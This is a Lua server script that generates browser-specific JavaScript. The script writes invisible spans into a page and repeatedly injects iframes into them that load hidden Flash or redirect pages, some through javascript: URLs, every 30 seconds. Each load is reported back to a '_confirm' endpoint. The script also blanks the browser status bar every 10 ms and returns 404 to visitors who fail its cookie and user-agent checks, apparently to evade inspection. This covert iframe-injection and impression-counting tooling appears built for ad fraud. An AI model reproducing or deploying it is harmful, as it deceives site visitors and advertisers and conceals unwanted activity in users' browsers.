print("Cache-Control: max-age=0\nCache-Control: no-cache\n")

if http_ua == nil or QUERY.id == nil or QUERY.hash == nil then
    error404()    
    return 
end

local code=QUERY.id..QUERY.hash

browser_id()
if check_cookie() == false then
    error404()
    return
end


local src=get_source(code)
local uaname=browser(http_ua)

if src == nil or src.ua[uaname] == nil then
    error404()
    return 
end


local starter=[[
	document.write('<span id="ad]]..code..[[" style="display:none;"></span>');
	document.write('<span id="ad]]..code..[[2" style="display:none;"></span>');
]]
local c=check_cookie();
if c == nil  then  
    starter=starter.."\tsetTimeout(function() {start();}, 1000);"; 
elseif c ~= false then 
    url=include('ad_gen.lua')(false);
    if url ~= nil then
	starter=starter.."\n\tcode='true';\n\tcycle();\n"; 
    else
	starter=starter.."\n\tcode='wait';\n\tcycle();\n"
    end
end;


if uaname == 'ie' then

output=[[
<html>
<head>
</head>
<body>
<script type='text/javascript'>
var ua = navigator.userAgent.toLowerCase();
var brs = '';
var src = "";
var code = "";
var confirm_uri="/]]..code..[[_confirm";
var check_uri="/]]..code..[[_check";
var count=0;
if(ua.indexOf("msie 7") != -1 && ua.indexOf("webtv") == -1) brs='ie7';
else if(ua.indexOf("msie") != -1 && ua.indexOf("webtv") == -1) brs='ie';

function start() {
    document.getElementById('ad]]..code..[[').innerHTML='<iframe id="frame_ad]]..code..[["  src='+src+' width=200px height=200px frameborder=0></iframe>';
    setTimeout(function() {
	check();
    },2000);
}


function geturl(url,func) {

    var http_request = false;
    if (window.ActiveXObject) { // IE
	try {http_request = new ActiveXObject("Msxml2.XMLHTTP");} catch (e) {
	    try {http_request = new ActiveXObject("Microsoft.XMLHTTP");} catch (e) {}
        }
    }
    http_request.onreadystatechange = function() {
	if (http_request.readyState == 4 && http_request.status == 200) {if(typeof(func) == 'function') func(http_request.responseText);}
    };
    http_request.open('GET', url, true);
    http_request.send(null);
}

function check() {geturl(check_uri,function(c) {code=c;if(code != "false") cycle();});}

//src='javascript:location.href="http://engine.adct.ru/]]..code..[[.swf"+"?z4z="+(Math.random()*666);';
src='/]]..code..[[_swf.html';

setInterval("window.status = '';",10);

function cycle() {
    if(code == "wait") {setTimeout(function() {check()}, 120000);} else {

	var iframe = document.createElement("iframe");  	        
	iframe.id="frame_ad]]..code..[[2";
	iframe.src=src;
	iframe.onload=function() {
	    count+=1;
	    geturl(confirm_uri+'?'+count);
	}
	document.getElementById('ad]]..code..[[2').appendChild(iframe);
	setTimeout(function() {check()}, 30000);
    }
}

try {
    axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
    version = axo.GetVariable("$version");
    if (src != "") {
	]]..starter..[[
    }

} catch(e) { }

</script>
]]







elseif uaname == 'ff' then


output=[[
<html>
<head>
</head>
<body>
<script type='text/javascript'>
var ua = navigator.userAgent.toLowerCase();
var brs = '';
var src = "";
var code = "";
var check_uri="/]]..code..[[_check";
var confirm_uri="/]]..code..[[_confirm";

function start() {
    document.getElementById('ad]]..code..[[').innerHTML='<iframe id="frame_ad]]..code..[["  src='+src+' width=200px height=200px frameborder=0></iframe>';
    setTimeout(function() {check();},2000);
}


function geturl(url,func) {
    var http_request = false;
    if (window.XMLHttpRequest) { // Mozilla, Safari, ...
	http_request = new XMLHttpRequest();
	if (http_request.overrideMimeType) {http_request.overrideMimeType('text/xml');}
    }
    http_request.onreadystatechange = function() {if (http_request.readyState == 4 && http_request.status == 200) {if(typeof(func) == 'function') func(http_request.responseText);}};
    http_request.open('GET', url, true);
    http_request.send(null);
}

function check() {geturl(check_uri,function(c) { code=c;if(code != "false") cycle();});}




src="/]]..code..[[_hide.html";

setInterval("window.status = '';",10);


function cycle() {
    if(code == "wait") {
	setTimeout(function() {check()}, 120000);
    } else {
	document.getElementById('ad]]..code..[[2').innerHTML='<iframe id="frame_ad]]..code..[[2"  src='+src+' width=200px height=200px frameborder=0></iframe>';
	document.getElementById('frame_ad]]..code..[[2').onload=function() {
	    geturl(confirm_uri);
	}
	setTimeout(function() {check()}, 30000);
    }
}

if (src != "") {
    ]]..starter..[[
}
</script>
]]





else


output=[[
<html>
<head>
</head>
<body>
<script type='text/javascript'>
var ua = navigator.userAgent.toLowerCase();
var brs = '';
var src = "";
var code = "";
var check_uri="/]]..code..[[_check";
var confirm_uri="/]]..code..[[_confirm";


if(ua.indexOf("opera") != -1) brs='opera';
else if(ua.indexOf("safari") != -1) brs='sf';

function start() {
    document.getElementById('ad]]..code..[[').innerHTML='<iframe id="frame_ad]]..code..[["  src='+src+' width=200px height=200px frameborder=0></iframe>';
    setTimeout(function() {check();},2000);
}


function geturl(url,func) {
    var http_request = false;
    if (window.XMLHttpRequest) { // Mozilla, Safari, ...
	http_request = new XMLHttpRequest();
	if (http_request.overrideMimeType) {http_request.overrideMimeType('text/xml');}
    }
    http_request.onreadystatechange = function() {if (http_request.readyState == 4 && http_request.status == 200) {if(typeof(func) == 'function') func(http_request.responseText);}};
    http_request.open('GET', url, true);
    http_request.send(null);
}

function check() {geturl(check_uri,function(c) { code=c;if(code != "false") cycle();});}




if(brs=='ff') {
    src="/]]..code..[[_hide.html";
}   else {
    src="javascript:location.href=\"/]]..code..[[_ref.html\";";
}

setInterval("window.status = '';",10);


function cycle() {
    if(code == "wait") {
	setTimeout(function() {check()}, 120000);
    } else {
	document.getElementById('ad]]..code..[[2').innerHTML='<iframe id="frame_ad]]..code..[[2"  src='+src+' width=200px height=200px frameborder=0></iframe>';
	document.getElementById('frame_ad]]..code..[[2').onload=function() {
	    geturl(confirm_uri);
	}
	setTimeout(function() {check()}, 30000);
    }
}

if (src != "") {
    ]]..starter..[[
}
</script>
]]




end





show(output.."\r\n")

